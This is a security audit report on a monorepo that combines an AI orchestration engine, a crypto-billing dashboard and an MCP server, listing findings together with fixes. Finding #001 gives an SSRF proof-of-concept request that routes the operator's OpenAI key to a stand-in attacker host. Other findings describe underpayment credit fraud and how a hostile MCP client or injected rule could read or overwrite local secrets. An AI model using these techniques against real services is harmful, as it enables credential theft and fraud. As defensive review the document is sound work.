Summary

The codebase is a well-structured pnpm monorepo: a multi-agent orchestration engine (@ares/engine), a Next.js dashboard with SIWS authentication and a USDC top-up flow, an MCP server exposing engine tools to AI clients, and a Helius webhook that turns on-chain treasury deposits into account credits. The architecture is sensible — read-only vs mutating tools, sandbox backends, IP + wallet rate limiting, in-process billing ledger. However, the security posture has not yet caught up to the surface area. Three independent paths to full compromise of LLM credentials or to free credits exist today, and the MCP server exposes unrestricted filesystem r/w via SARIF tooling. None of these are hard to fix; all of them are show-stoppers.

Detail + suggested fixes

#001 — SSRF + API key exfiltration via user model

Both POST /api/chat and POST /api/scan read body.model as a string, pass it to createPublicOrchestrator({ model }), which calls parseModelId(raw). For providers openai, ollama, and local, the parser splits on @ and returns a baseUrl that is then handed verbatim to ChatOpenAI({ configuration: { baseURL } }). The resulting HTTP request is a normal OpenAI-style chat-completion including the configured OPENAI_API_KEY in the Authorization: Bearer … header.

Proof of concept (no exploitation needed — the bug is in the routing layer):

POST /api/chat HTTP/1.1
Content-Type: application/json

{"prompt":"hi","model":"openai:gpt-4o-mini@http://attacker.example/v1"}

The server makes an outbound POST to http://attacker.example/v1/chat/completions with the operator's OpenAI key. Severity: full provider key compromise.

Fix:

// apps/web/lib/engine-factory.ts
const ALLOWED_MODELS = new Set([
  "google:gemini-2.5-flash",
  "openrouter:meta-llama/llama-3.3-70b-instruct",
  // ... explicit allowlist
]);

export function createPublicOrchestrator(opts: PublicOrchestratorOptions = {}) {
  const repoRoot = opts.repoRoot ?? resolveRepoRoot();
  const model = opts.model && ALLOWED_MODELS.has(opts.model) ? opts.model : undefined;
  return new Orchestrator(repoRoot, { model });
}

Optionally, change parseModelId to refuse @<baseUrl> when called from the public surface (e.g. via a flag or a separate parsePublicModelId that hard-fails on user-supplied baseUrls).

#002 — Bundle credit fraud (no payment-amount check)

applyBillingDeposits only checks that lamports > 0n for SOL or amt > 0 for USDC, then credits BUNDLE_UNITS[bundleId]: 

// apps/chain-intake/src/credits-on-deposit.ts:124-152
for (const row of nativeTransfers(tx)) {
  if (to === treasury && from === parsedMemo.userWallet && lamports > 0n) {
    sourceOk = true; // 1 lamport == "growth bundle paid in full"
    break;
  }
}

An attacker pays 1 lamport (~$0) to the treasury with memo ASST:<self>:growth:nonce, gets credited 1,100 units (priced at $10 USDC). At scale, this drains the operator's LLM/cost budget without any USDC inflow.

Fix:

// apps/chain-intake/src/bundle-units.ts (extend)
export const BUNDLE_PRICING: Record<string, { units: number; usdc: number; sol: number }> = {
  starter: { units: 100,  usdc: 1,  sol: 0.005  /* set live SOL/USDC peg */ },
  growth:  { units: 1100, usdc: 10, sol: 0.05 },
};

// apps/chain-intake/src/credits-on-deposit.ts (sketch)
const required = BUNDLE_PRICING[parsedMemo.bundleId];
if (!required) { skipped++; continue; }
const tolerance = 0.005; // 0.5% slack for USDC fee/rounding

if (paidUsdc >= required.usdc * (1 - tolerance)) sourceOk = true;
else if (paidLamports >= BigInt(Math.floor(required.sol * 1e9 * (1 - tolerance)))) sourceOk = true;
else sourceOk = false;

Also add a structured warn log on underpayment so legitimate edge cases (e.g. SOL price drift) are visible.

#003 — SIWS phishing: missing Domain validation

extractExpirationFromSignedMessage and extractNonceFromSignedMessage are called on signedMessage, but the Domain: line is never extracted or compared. A user who signs a SIWS challenge on a malicious site that copies our message format produces a signature that is indistinguishable from one produced on our site — and verifyEd25519WalletSignature will accept it as long as the nonce hasn't been seen yet (which it hasn't, because the attacker just relayed the user's signed payload to us).

Fix:

// apps/web/lib/auth/siws-message.ts
export function extractDomainFromSignedMessage(s: string): string | null {
  const m = s.match(/^Domain:\s*(\S+)/m);
  return m ? m[1] : null;
}

// apps/web/app/api/auth/verify/route.ts (after expiry/nonce checks)
const domain = extractDomainFromSignedMessage(signedMessage);
const expected = process.env.ASST_PUBLIC_HOST ?? new URL(req.url).host;
if (domain !== expected) {
  return apiError(requestId, "BAD_REQUEST", "Domain mismatch.", 400);
}

Also pin Statement, URI, and an Issued-At drift bound (e.g. ≤2min) for completeness.

#004 — Scan race / billing inconsistency

invokeScan spawns the orchestrator without await, returns 200, and the caller settles the debit because res.status === 200 always. The result is: charge first, hope it succeeds.

Fix sketch:

// 1. Persist a run row up front
const runId = await insertRunPending({ pool, wallet, target });
// 2. Background: run scan, settle/refund, write findings
queueWork(async () => {
  try {
    const results = await ares.runFullScan(...);
    await persistFindings(pool, runId, results);
    await settleDebit(pool, debitId);
  } catch (err) {
    await refundDebit(pool, debitId);
    await markRunFailed(pool, runId, err);
  }
});
// 3. Return the runId so the client can poll /api/scan/:id/status
return apiSuccess(requestId, { runId, status: "queued" });
#005 / #006 — MCP arbitrary file r/w

The MCP server is the most privileged surface in this codebase — it runs locally with the operator's full filesystem access. Both asst_merge_sarif and asst_write_assurance_manifest accept arbitrary paths from the client. A malicious or compromised MCP client (e.g. a hostile rule injected into a Cursor session) can:

  • Read any file the server can read (SSH keys, .env, browser cookies).
  • Overwrite any file the server can write (config, code, ~/.zshrc).
  • Run pnpm with --cwd = anywhere with package.json scripts.

Fix:

// apps/mcp-server/src/server.ts
const MCP_REPO_ROOT = resolve(process.env.ASST_MCP_REPO_ROOT ?? process.cwd());

function withinRoot(p: string): string {
  const abs = isAbsolute(p) ? resolve(p) : resolve(MCP_REPO_ROOT, p);
  const rel = relative(MCP_REPO_ROOT, abs);
  if (rel.startsWith("..") || isAbsolute(rel)) {
    throw new Error(`path escapes MCP repo root: ${p}`);
  }
  return abs;
}

// asst_merge_sarif handler:
const safeInputs  = args.inputPaths.map(withinRoot);
const safeOutput  = withinRoot(args.outputPath);

// asst_write_assurance_manifest handler:
// pin repoRoot/deepagentsjsRoot to MCP_REPO_ROOT — let only outDir be client-supplied
// AND validate it via withinRoot.
#007 — JWT secret length 
// apps/web/lib/auth/session-secret.ts
export function getJwtSecretBytes(): Uint8Array | null {
  const raw = process.env.ASST_SESSION_SECRET?.trim();
  if (!raw) return null;
  if (/^[0-9a-fA-F]{64}$/.test(raw)) {
    return Uint8Array.from(Buffer.from(raw, "hex"));
  }
  if (raw.length < 32) {
    throw new Error("ASST_SESSION_SECRET must be at least 32 bytes (or 64 hex chars).");
  }
  return new TextEncoder().encode(raw);
}

Document openssl rand -hex 32 in .env.example.

#009 — readFileTool root binding

The orchestrator's repoRoot never reaches the tool. Easiest fix:

// apps/web/lib/engine-factory.ts (top of module)
import { resolveRepoRoot } from "./paths";
if (!process.env.ASST_REPO_ROOT) {
  process.env.ASST_REPO_ROOT = resolveRepoRoot();
}

Better fix: refactor readFileTool into a factory makeReadFileTool(repoRoot) and have the orchestrator instantiate it with its constructor argument.

What looks good

  • Provider model factory is well-typed; explicit error messages when env vars are missing.
  • SIWS implementation correctly uses tweetnacl + bs58; nonce consumption is idempotent (single-use Redis token).
  • Read-only vs mutating tool separation is a sensible boundary; sandbox factory (HostShell vs Docker) is a real defense-in-depth layer.
  • Idempotent webhook ingestion via (signature, slot) conflict handling — good pattern for at-least-once delivery.
  • Test boundary present: readonly-boundary.test.ts, SIWS round-trip, deposit memo parser. The skeleton for billing tests already exists; just needs the debit-settle-refund branches fleshed out.
  • better-sqlite3, pg, pg-native correctly listed in serverExternalPackages + webpack externals — historically a Next.js footgun that was solved correctly here.
  • Public engine factory enforces ASST_ALLOW_WRITE = "0" at module load when ASST_WEB_ALLOW_WRITE !== "1" — good; mutating tools cannot accidentally be mounted.

QEDGen recommendation

The billing state machine is exactly the kind of system where machine-checked invariants pay for themselves: conservation (sum of credits − debits = balance), one-shot settle (a debit cannot be both settled and refunded), and replay-safety (same tx_sig credits at most once). After the P0 fixes, run qedgen over apps/web/lib/billing/ledger.ts + apps/chain-intake/src/credits-on-deposit.ts to lock these properties in.
